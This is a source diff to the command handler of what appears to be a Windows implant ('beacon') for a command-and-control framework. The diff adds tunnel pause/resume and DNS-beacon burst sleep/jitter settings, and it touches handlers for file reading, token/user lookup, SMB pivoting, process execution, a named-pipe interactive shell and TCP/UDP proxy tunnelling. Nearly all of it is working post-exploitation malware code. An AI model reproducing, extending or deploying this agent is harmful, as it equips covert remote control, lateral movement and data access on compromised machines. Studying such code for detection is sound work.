@@ -1,13 +1,13 @@
 #include "Commander.h"
 #include "Boffer.h"
 
-void* Commander::operator new(size_t sz)
+void* Commander::operator new(size_t sz) 
 {
 	void* p = MemAllocLocal(sz);
 	return p;
 }
 
-void Commander::operator delete(void* p) noexcept
+void Commander::operator delete(void* p) noexcept 
 {
 	MemFreeLocal(&p, sizeof(Commander));
 }
@@ -122,6 +122,12 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		case COMMAND_TUNNEL_WRITE_UDP:
 			this->CmdTunnelMsgWriteUDP(CommandId, inPacker, outPacker); break;
 
+		case COMMAND_TUNNEL_PAUSE: 
+			this->CmdTunnelMsgPause(CommandId, inPacker, outPacker); break;
+		
+		case COMMAND_TUNNEL_RESUME: 
+			this->CmdTunnelMsgResume(CommandId, inPacker, outPacker); break;
+
 		case COMMAND_TUNNEL_CLOSE:
 			this->CmdTunnelMsgClose(CommandId, inPacker, outPacker); break;
 
@@ -153,14 +159,9 @@ void Commander::CmdCat(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	outPacker->Pack32(taskId);
 
 	HANDLE hFile = ApiWin->CreateFileA(path, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
-	if ((!hFile) || (hFile == INVALID_HANDLE_VALUE)) {
+	if ( !hFile || hFile == INVALID_HANDLE_VALUE ) {
 		outPacker->Pack32(COMMAND_ERROR);
 		outPacker->Pack32(TEB->LastErrorValue);
-
-		if (hFile) {
-			ApiNt->NtClose(hFile);
-			hFile = NULL;
-		}
 		return;
 	}
 
@@ -348,7 +349,6 @@ void Commander::CmdGetUid(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	ULONG taskId = inPacker->Unpack32();
 
 	outPacker->Pack32(taskId);
-	outPacker->Pack32(commandId);
 
 	BOOL  result       = FALSE;
 	BOOL  elevated     = FALSE;
@@ -362,6 +362,7 @@ void Commander::CmdGetUid(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		result = TokenToUser(TokenHandle, username, &usernameSize, domain, &domainSize, &elevated);
 
 	if (result) {
+		outPacker->Pack32(commandId);
 		outPacker->Pack8(elevated);
 		outPacker->PackStringA(domain);
 		outPacker->PackStringA(username);
@@ -370,6 +371,9 @@ void Commander::CmdGetUid(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->Pack32(COMMAND_ERROR);
 		outPacker->Pack32(TEB->LastErrorValue);
 	}
+
+	if (TokenHandle)
+		ApiNt->NtClose(TokenHandle);
 
 	MemFreeLocal( (LPVOID*)&username, 512);
 	MemFreeLocal( (LPVOID*)&domain, 512);
@@ -423,9 +427,6 @@ void Commander::CmdLink(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG pivotType = inPacker->Unpack32();
 
-	DWORD BytesSize = 0;
-	PVOID Output = NULL;
-
 	if (pivotType == PIVOT_TYPE_SMB) {
 		ULONG pipeSize = 0;
 		CHAR* pipe     = (CHAR*)inPacker->UnpackBytes(&pipeSize);
@@ -469,9 +470,13 @@ void Commander::CmdLs(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		}
 	}
 
-	fullpath[fullpathSize]   = '\\';
-	fullpath[++fullpathSize] = '*';
-	fullpath[++fullpathSize] = 0;
+	DWORD fileAttribs = ApiWin->GetFileAttributesA(fullpath);
+	BOOL isFile = (fileAttribs != INVALID_FILE_ATTRIBUTES) && !(fileAttribs & FILE_ATTRIBUTE_DIRECTORY);
+	if (!isFile) {
+		fullpath[fullpathSize] = '\\';
+		fullpath[++fullpathSize] = '*';
+		fullpath[++fullpathSize] = 0;
+	}
 
 	WIN32_FIND_DATAA findData = { 0 };
 	HANDLE File = ApiWin->FindFirstFileA(fullpath, &findData);
@@ -504,7 +509,7 @@ void Commander::CmdLs(ULONG commandId, Packer* inPacker, Packer* outPacker)
 
 			count++;
 
-		} while (ApiWin->FindNextFileA(File, &findData));
+		} while (!isFile && ApiWin->FindNextFileA(File, &findData));
 		ApiWin->FindClose(File);
 		outPacker->Set32(indexCount, count);
 	}
@@ -615,6 +620,35 @@ void Commander::CmdProfile(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->Pack32(subcommand);
 		outPacker->Pack32(agent->config->working_time);
 	}
+#if defined(BEACON_DNS)
+	else if (subcommand == 5) { // burst set
+		ULONG burstEnabled = inPacker->Unpack32();
+		ULONG burstSleep   = inPacker->Unpack32();
+		ULONG burstJitter  = inPacker->Unpack32();
+		ULONG taskId       = inPacker->Unpack32();
+
+		agent->config->profile.burst_enabled = burstEnabled;
+		agent->config->profile.burst_sleep   = burstSleep;
+		agent->config->profile.burst_jitter  = burstJitter;
+
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_PROFILE);
+		outPacker->Pack32(subcommand);
+		outPacker->Pack32(agent->config->profile.burst_enabled);
+		outPacker->Pack32(agent->config->profile.burst_sleep);
+		outPacker->Pack32(agent->config->profile.burst_jitter);
+	}
+	else if (subcommand == 6) { // burst show
+		ULONG taskId = inPacker->Unpack32();
+
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_PROFILE);
+		outPacker->Pack32(subcommand);
+		outPacker->Pack32(agent->config->profile.burst_enabled);
+		outPacker->Pack32(agent->config->profile.burst_sleep);
+		outPacker->Pack32(agent->config->profile.burst_jitter);
+	}
+#endif
 }
 
 void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
@@ -782,7 +816,7 @@ void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	if (progOutput) {
 		SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
 		ApiWin->CreatePipe(&pipeRead, &pipeWrite, &sa, 0);
-
+		
 		spi.hStdError  = pipeWrite;
 		spi.hStdOutput = pipeWrite;
 		spi.hStdInput  = NULL;
@@ -890,10 +924,10 @@ void Commander::CmdShellStart(ULONG commandId, Packer* inPacker, Packer* outPack
 
 	HANDLE beaconOutPipe = ApiWin->CreateNamedPipeA(pipeName, PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 0x4000, 0x4000, 0, &sa);
 	HANDLE shellOutPipe  = ApiWin->CreateFileA(pipeName, FILE_WRITE_DATA | SYNCHRONIZE, 0, &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
-
+	
 	r1 = GenerateRandom32();
 	ApiWin->snprintf(pipeName, 18, "\\\\.\\pipe\\%08lx", r1);
-
+	
 	HANDLE beaconInPipe = ApiWin->CreateNamedPipeA(pipeName, PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 0x4000, 0x4000, 0, &sa);
 	HANDLE shellInPipe  = ApiWin->CreateFileA(pipeName, FILE_READ_DATA | SYNCHRONIZE, 0, &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
 
@@ -936,7 +970,7 @@ void Commander::CmdShellStart(ULONG commandId, Packer* inPacker, Packer* outPack
 	}
 }
 
-void Commander::CmdShellWrite(ULONG commandId, Packer* inPacker, Packer* outPacker)
+void Commander::CmdShellWrite(ULONG commandId, Packer* inPacker, Packer* outPacker) 
 {
 	ULONG jobId = inPacker->Unpack32();
 	ULONG dataSize = 0;
@@ -989,7 +1023,7 @@ void Commander::CmdTunnelMsgWriteTCP(ULONG commandId, Packer* inPacker, Packer* 
 	CHAR* data      = (CHAR*)inPacker->UnpackBytes(&dataSize);
 	ULONG taskId	= inPacker->Unpack32();
 
-	this->agent->proxyfire->ConnectWriteTCP(channelId, data, dataSize);
+	this->agent->proxyfire->ConnectWriteTCP(channelId, data, dataSize, outPacker);
 }
 
 void Commander::CmdTunnelMsgWriteUDP(ULONG commandId, Packer* inPacker, Packer* outPacker)
@@ -1000,6 +1034,18 @@ void Commander::CmdTunnelMsgWriteUDP(ULONG commandId, Packer* inPacker, Packer* 
 	ULONG taskId = inPacker->Unpack32();
 
 	this->agent->proxyfire->ConnectWriteUDP(channelId, data, dataSize);
+}
+
+void Commander::CmdTunnelMsgPause(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG channelId = inPacker->Unpack32();
+	this->agent->proxyfire->ConnectPause(channelId);
+}
+
+void Commander::CmdTunnelMsgResume(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG channelId = inPacker->Unpack32();
+	this->agent->proxyfire->ConnectResume(channelId);
 }
 
 void Commander::CmdTunnelMsgClose(ULONG commandId, Packer* inPacker, Packer* outPacker)
